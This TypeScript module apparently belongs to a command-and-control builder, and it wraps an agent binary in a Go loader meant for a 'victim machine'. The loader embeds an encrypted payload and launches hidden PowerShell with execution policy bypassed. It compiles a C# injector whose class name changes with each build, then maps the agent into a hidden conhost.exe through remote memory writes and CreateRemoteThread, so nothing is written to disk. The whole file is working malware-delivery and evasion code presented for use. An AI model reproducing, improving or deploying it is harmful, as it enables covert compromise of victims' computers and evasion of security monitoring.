/**
 * exe-wrapper.ts — Wraps a compiled PE binary in a Go-based LOLBAS loader
 * that injects the agent into conhost.exe entirely in-memory.
 * No files are written to disk on the victim machine.
 *
 * Two-stage build:
 *   1. Build server compiles agent → PE bytes
 *   2. Encrypt PE (XOR + gzip) → embed in Go loader as payload.dat
 *   3. Compile Go loader → final .exe (replaces raw agent PE)
 *
 * Execution chain on victim:
 *   1. User runs the .exe (looks like any normal executable)
 *   2. Go loader reads embedded encrypted payload from itself
 *   3. Sets env vars with base64-encoded payload + C# injector source
 *   4. Launches PowerShell hidden (no window, CREATE_NO_WINDOW flag)
 *   5. PS decrypts XOR+gzip payload from env var in memory
 *   6. C# P/Invoke injector compiled via Add-Type (random class name per build)
 *   7. conhost.exe started hidden (LOTL — Console Window Host, always present)
 *   8. PE manually mapped into conhost via VirtualAllocEx + WriteProcessMemory
 *   9. Relocations + imports resolved remotely
 *  10. CreateRemoteThread at PE entry point
 *  11. Go loader exits, agent runs inside conhost.exe — no files on disk
 */

import fs from "fs";
import path from "path";
import { $ } from "bun";
import {
  encryptPayload,
  randClassName,
  randHex,
  buildCSharpInjector,
  buildPsInjectionChain,
} from "./pe-injector";

/**
 * Build the Go loader source code that embeds the encrypted PE,
 * sets up env vars, and launches PS hidden for injection.
 */
function buildGoSource(csB64: string, psEnc: string): string {
  // Use backtick raw strings for the constants to avoid escaping issues
  // Go raw strings can't contain backticks, so use double-quoted strings
  // with proper escaping for the base64 content (which is safe — only [A-Za-z0-9+/=])
  return `package main

import (
	_ "embed"
	"encoding/base64"
	"os"
	"os/exec"
	"syscall"
)

//go:embed payload.dat
var ep []byte

const csB64 = "${csB64}"

const psEnc = "${psEnc}"

func main() {
	os.Setenv("_EXE_D", base64.StdEncoding.EncodeToString(ep))
	os.Setenv("_EXE_CS", csB64)
	cmd := exec.Command(
		os.Getenv("SYSTEMROOT")+"\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
		"-nop", "-w", "h", "-ep", "b", "-enc", psEnc,
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
	cmd.Start()
}
`;
}

/**
 * Wraps a compiled PE binary into a Go-based LOLBAS loader .exe that injects
 * the agent into conhost.exe entirely in-memory.
 *
 * @param peBytes    The raw PE binary (agent EXE) bytes
 * @param outPath    Where to write the resulting loader .exe
 * @param goArch     Target architecture (amd64, 386, arm64)
 * @param workDir    Parent directory for temp build files
 */
export async function wrapPeAsLoaderExe(
  peBytes: Buffer,
  outPath: string,
  goArch: string,
  workDir: string,
): Promise<void> {
  const tmpDir = path.join(workDir, `_exe_loader_${randHex(8)}`);
  fs.mkdirSync(tmpDir, { recursive: true });

  try {
    // 1. Encrypt + compress PE payload
    const encrypted = encryptPayload(peBytes);
    fs.writeFileSync(path.join(tmpDir, "payload.dat"), encrypted);

    // 2. Build C# injector (random class name per build)
    const className = randClassName();
    const csharpCode = buildCSharpInjector(className);
    const csB64 = Buffer.from(csharpCode, "utf-8").toString("base64");

    // 3. Build PowerShell injection chain
    //    PS reads payload + C# from env vars set by Go loader
    const psLines = [
      `$d=[Convert]::FromBase64String($env:_EXE_D)`,
      `$cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($env:_EXE_CS))`,
    ];
    const chain = buildPsInjectionChain("$d", "$cs", className, "conhost.exe");
    const psScript = psLines.join(";") + ";" + chain;
    const psEnc = Buffer.from(psScript, "utf16le").toString("base64");

    // 4. Generate Go source
    const goSource = buildGoSource(csB64, psEnc);
    fs.writeFileSync(path.join(tmpDir, "main.go"), goSource);
    fs.writeFileSync(path.join(tmpDir, "go.mod"), "module loader\n\ngo 1.21\n");

    // 5. Compile loader
    const buildEnv: Record<string, string> = {
      ...Object.fromEntries(
        Object.entries(process.env).filter(([, v]) => v !== undefined) as [string, string][],
      ),
      GOOS: "windows",
      GOARCH: goArch,
      CGO_ENABLED: "0",
    };

    const result = await $`go build -trimpath -ldflags "-s -w" -o ${outPath} .`
      .env(buildEnv)
      .cwd(tmpDir)
      .nothrow()
      .quiet();

    if (result.exitCode !== 0) {
      const stderr = result.stderr.toString().trim();
      throw new Error(`Go loader build failed (exit ${result.exitCode}): ${stderr}`);
    }
  } finally {
    // Cleanup temp directory
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}
